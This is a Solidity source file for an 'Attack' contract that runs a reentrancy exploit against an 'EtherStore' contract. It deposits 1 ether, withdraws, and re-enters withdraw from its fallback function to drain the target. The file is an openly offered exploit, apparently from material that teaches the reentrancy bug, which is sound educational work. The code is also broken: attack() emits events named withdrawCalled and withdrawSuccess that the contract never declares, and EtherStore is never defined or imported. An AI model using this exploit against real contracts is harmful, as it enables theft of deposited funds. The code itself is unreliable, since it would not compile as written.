// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attack {

    event attackCalled(address addr);
    event attackSuccess(address addr);
    event fallbackCalled(address addr);
    event fallbackSuccess(address addr);

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        emit fallbackCalled(msg.sender);
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
        emit fallbackSuccess(msg.sender);

    }

    function attack() external payable {
        emit withdrawCalled(msg.sender);
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
        emit withdrawSuccess(msg.sender);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}